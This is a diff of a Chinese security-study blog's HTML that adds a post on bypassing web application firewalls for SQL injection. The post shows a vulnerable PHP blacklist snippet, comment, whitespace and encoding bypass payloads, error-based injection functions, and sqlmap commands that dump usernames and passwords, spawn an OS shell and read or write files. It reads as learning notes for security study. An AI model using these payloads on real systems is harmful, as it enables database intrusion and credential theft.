@@ -20,25 +20,27 @@
   <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.8.1","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js"></script>
-<meta name="description" content="散人的漫漫学习路">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Hack the world">
-<meta property="og:url" content="http://example.com/archives/2022/page/3/index.html">
+<meta name="description" content="原理掌握mysql函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法&#x3D;绕过WAF防护 代码实现： （部分） $id &#x3D;$_GET[‘id’]; $id &#x3D; blacklist($id); $sql&#x3D;’select * from users where id&#x3D;’$id’ limit 0,1”; $result &#x3D; mysql_query($sql); $row &#x3D; mysql_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WAF绕过">
+<meta property="og:url" content="http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/index.html">
 <meta property="og:site_name" content="Hack the world">
-<meta property="og:description" content="散人的漫漫学习路">
+<meta property="og:description" content="原理掌握mysql函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法&#x3D;绕过WAF防护 代码实现： （部分） $id &#x3D;$_GET[‘id’]; $id &#x3D; blacklist($id); $sql&#x3D;’select * from users where id&#x3D;’$id’ limit 0,1”; $result &#x3D; mysql_query($sql); $row &#x3D; mysql_">
 <meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-03-20T11:31:17.832Z">
+<meta property="article:modified_time" content="2022-03-20T11:31:58.004Z">
 <meta property="article:author" content="D0gekong">
 <meta name="twitter:card" content="summary">
 
 
-<link rel="canonical" href="http://example.com/archives/2022/page/3/">
+<link rel="canonical" href="http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/">
 
 
 
-<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"zh-CN","comments":"","permalink":"","path":"archives/2022/page/3/index.html","title":""}</script>
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/","path":"2022/03/20/SQL/WAF绕过/","title":"WAF绕过"}</script>
 
 <script class="next-config" data-name="calendar" type="application/json">""</script>
-<title>归档 | Hack the world</title>
+<title>WAF绕过 | Hack the world</title>
   
 
 
@@ -105,7 +107,7 @@
 
   <aside class="sidebar">
 
-    <div class="sidebar-inner sidebar-overview-active">
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
       <ul class="sidebar-nav">
         <li class="sidebar-nav-toc">
           文章目录
@@ -118,6 +120,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8E%9F%E7%90%86"><span class="nav-number">1.</span> <span class="nav-text">原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-number">2.</span> <span class="nav-text"></span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sqlmap%E5%B8%B8%E8%A7%81%E5%91%BD%E4%BB%A4"><span class="nav-number">3.</span> <span class="nav-text">sqlmap常见命令</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -175,212 +178,192 @@
 </noscript>
 
 
-    <div class="main-inner archive posts-collapse">
+    <div class="main-inner post posts-expand">
 
 
   
-  
-  
-  <div class="post-block">
-    <div class="post-content">
-      <div class="collection-title">
-        <span class="collection-header">嗯..! 目前共计 30 篇日志。 继续努力。</span>
-      </div>
 
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/20/SQL/WAF%E7%BB%95%E8%BF%87/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/pic.jpg">
+      <meta itemprop="name" content="D0gekong">
+      <meta itemprop="description" content="散人的漫漫学习路">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hack the world">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          WAF绕过
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
       
-    <div class="collection-year">
-      <span class="collection-header">2022</span>
+
+      <time title="创建时间：2022-03-20 19:31:17 / 修改时间：19:31:58" itemprop="dateCreated datePublished" datetime="2022-03-20T19:31:17+08:00">2022-03-20</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>掌握mysql函数和语法使用方法+深入了解中间件运行处理机制+了解WAF防护原理及方法=绕过WAF防护</p>
+<p>代码实现：</p>
+<p>（部分）</p>
+<p>$id =$_GET[‘id’];</p>
+<p>$id = blacklist($id);</p>
+<p>$sql=’select * from users where id=’$id’ limit 0,1”;</p>
+<p>$result = mysql_query($sql);</p>
+<p>$row = mysql_fetch_array($result);</p>
+<p>function blacklist($id)</p>
+<p>{</p>
+<p>$id = preg_replace(‘/or/i’,’’,$id);</p>
+<p>$id = preg_replace(‘/AND/i’,’’,$id);</p>
+<p>return $id;</p>
+<p>}</p>
+<p>1.分析代码：</p>
+<p>使用了Blacklist函数过滤了’or’和’and’</p>
+<p>2.绕过限制</p>
+<p> 大小写变形：Or OR,oR 等价替换：and = &amp; or = || 双写等</p>
+<p>黑盒绕过：</p>
+<ol>
+<li>架构层绕过：</li>
+</ol>
+<ul>
+<li>寻找源站，针对云WAF</li>
+<li>利用同网段，绕过WAF防护区域</li>
+<li>利用边界漏洞，绕过WAF防护区</li>
+</ul>
+<p> 2.资源限制角度绕过WAF</p>
+<ul>
+<li><pre><code> post大body
+</code></pre>
+</li>
+</ul>
+<p> 3.协议层面绕WAF</p>
+<ul>
+<li>协议未覆盖WAF<br>（请求方式变化：get&gt;post 参数污染）</li>
+</ul>
+<p> 4.规则层面绕过</p>
+<ol>
+<li>sql注释符绕过</li>
+</ol>
+<ul>
+<li>union /**/select</li>
+<li>union/<em>aaa%01bbs</em>/select</li>
+<li>union/<em>aaaaaaaaaaaaaaaaaaaaaa</em>/select</li>
+<li>内联注释:/<em>!xxx</em>/</li>
+</ul>
+<p> 2.空白符绕过</p>
+<ul>
+<li>mysql空白符:%09.%0A.%0B.%0D.%0C.%A0.%20,/<em>xxx</em>/</li>
+<li>正则的空白符：%09.%0A.%0B.%0D.%20<br>exa1:union%250Cselect</li>
+</ul>
+<p>exa2:union%25A0select</p>
+<p> 3.函数分割符号：</p>
+<ul>
+<li> concat%2520(</li>
+<li>concat/**/(</li>
+<li>concat%250c(</li>
+<li>concat%25a0(</li>
+</ul>
+<p> 4.浮点数词法解析</p>
+<ul>
+<li><p>select * from users where id = 8E0union select 1,2,3,4,5,6,7,8,0</p>
+</li>
+<li><p>select * from users where id = 8.0 union select 1,2,3,4,5,6,7,8,0</p>
+</li>
+<li><p>select * from users where id =\N union select 1,2,3,4,5,6,7,8,9,0<br>5.利用error-base进行sql注入：error-based sql注入函数非常容易被忽略</p>
+</li>
+<li><p>extractvalue(1,concat(0x5c,md5(3)));</p>
+</li>
+<li><p>updatexml(1,concat(0x5d,md5(3)),1);</p>
+</li>
+<li><p>GeometryCollection((select * from(select * from(select@@version)f)x))</p>
+</li>
+<li><p>polygon((select * from (select name_const(version(),1))x))</p>
+</li>
+<li><p>linestring()</p>
+</li>
+<li><p>multipoint()</p>
+</li>
+<li><p>multilinestring()</p>
+</li>
+<li><p>multipolygon()</p>
+</li>
+</ul>
+<p> 6.mysql特殊语法</p>
+<ul>
+<li> select{x table_name}from{x information_schema.tables};<br>以注释符绕过为例，采取工具BP进行fuzz注释符内的字符获取payload</li>
+</ul>
+<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="sqlmap常见命令"><a href="#sqlmap常见命令" class="headerlink" title="sqlmap常见命令"></a>sqlmap常见命令</h2><p>sqlmap.py -u ‘url?id=1’</p>
+<p>sqlmap.py -u ‘url?id=1’ – current-db</p>
+<p>sqlmap.py -u ‘url?id=1’ –current-user</p>
+<p>sqlmap.py -u ‘url?id=1’ -D security –tables</p>
+<p>sqlmap.py -u ‘url?id=1’ -D security -T users –columns</p>
+<p>sqlmap.py -u ‘url?id=1’ -D security -T users -C username,password –dump</p>
+<p>sqlmap.py -u ‘url?id=1’ –os-shell</p>
+<p>sqlmap.py -u ‘url?id=1’ –sql-shell</p>
+<p>sqlmap.py -u ‘url?id=1’ –file-read</p>
+<p>sqlmap.py -u ‘url?id=1’ –file-write 本地文件 –file-dest 目标目录及文件</p>
+
     </div>
 
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-02-27T20:33:02+08:00"
-              content="2022-02-27">
-          02-27
-        </time>
-      </div>
+    
+    
+    
 
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/27/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%9A%84%E4%B8%80%E4%BA%9B%E5%AD%A6%E4%B9%A0%E6%A6%82%E8%BF%B0/" itemprop="url">
-            <span itemprop="name">暴力破解的一些学习概述</span>
-          </a>
-      </div>
+    <footer class="post-footer">
 
-      
-    </header>
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2022/03/20/SQL/%E5%85%B6%E4%BB%96%E6%B3%A8%E5%85%A5/" rel="prev" title="其他注入">
+                  <i class="fa fa-chevron-left"></i> 其他注入
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/03/21/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="next" title="文件上传">
+                  文件上传 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
   </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-02-27T20:15:11+08:00"
-              content="2022-02-27">
-          02-27
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/02/27/%E8%83%A1%E6%80%9D%E4%B9%B1%E6%83%B3/%E5%81%B6%E5%B0%94%E7%9A%84%E9%9A%8F%E7%AC%94/" itemprop="url">
-            <span itemprop="name">偶尔的随笔</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-25T23:37:37+08:00"
-              content="2022-01-25">
-          01-25
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/25/HGAME2022/HGAME2022%20WEEK%201%20-1/" itemprop="url">
-            <span itemprop="name">HGAME2022 WEEK 1-1</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-25T22:53:47+08:00"
-              content="2022-01-25">
-          01-25
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/25/HGAME2022/HGAME2022%20WEEK%201%20-2/" itemprop="url">
-            <span itemprop="name">HGAME2022 WEEK 1-2</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-25T17:16:15+08:00"
-              content="2022-01-25">
-          01-25
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/25/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95%E7%AE%80%E6%9E%90%E5%8F%8A%E4%BE%8B%E9%A2%98/%E9%AB%98%E7%B2%BE%E5%BA%A6%E7%AE%97%E6%B3%95%E7%AE%80%E6%9E%90%E5%8F%8A%E4%BE%8B%E9%A2%98/" itemprop="url">
-            <span itemprop="name">高精度算法简析及例题</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-20T16:55:52+08:00"
-              content="2022-01-20">
-          01-20
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/20/%E4%B8%A4%E9%81%93%E7%BB%8F%E5%85%B8%E7%B1%BB%E5%9E%8B%E9%A2%98/%E4%B8%A4%E9%81%93%E7%BB%8F%E5%85%B8%E7%B1%BB%E5%9E%8B%E9%A2%98/" itemprop="url">
-            <span itemprop="name">两道经典类型题</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-20T16:55:41+08:00"
-              content="2022-01-20">
-          01-20
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/20/%E5%B8%B8%E8%A7%81%E5%9F%BA%E7%A1%80%E7%94%B5%E8%84%91%E6%93%8D%E4%BD%9C/%E5%B8%B8%E8%A7%81%E5%9F%BA%E7%A1%80%E7%94%B5%E8%84%91%E6%93%8D%E4%BD%9C/" itemprop="url">
-            <span itemprop="name">常见基础电脑操作</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-19T16:20:02+08:00"
-              content="2022-01-19">
-          01-19
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/19/%E8%AE%B0%E5%BD%95%E5%87%A0%E9%81%93NOI%E9%A2%98%E7%9B%AE/NOI%20problems/" itemprop="url">
-            <span itemprop="name">几道NOI题目</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
-
-  <article itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-      <div class="post-meta-container">
-        <time itemprop="dateCreated"
-              datetime="2022-01-10T17:29:54+08:00"
-              content="2022-01-10">
-          01-10
-        </time>
-      </div>
-
-      <div class="post-title">
-          <a class="post-title-link" href="/2022/01/10/%E5%A4%8D%E5%81%A5/first%20day/" itemprop="url">
-            <span itemprop="name">复健</span>
-          </a>
-      </div>
-
-      
-    </header>
-  </article>
+</div>
 
 
-    </div>
-  </div>
-  
-  
-  
-  <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/archives/2022/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/archives/2022/">1</a><a class="page-number" href="/archives/2022/page/2/">2</a><span class="page-number current">3</span>
-  </nav>
+
+
+
 
 </div>
   </main>
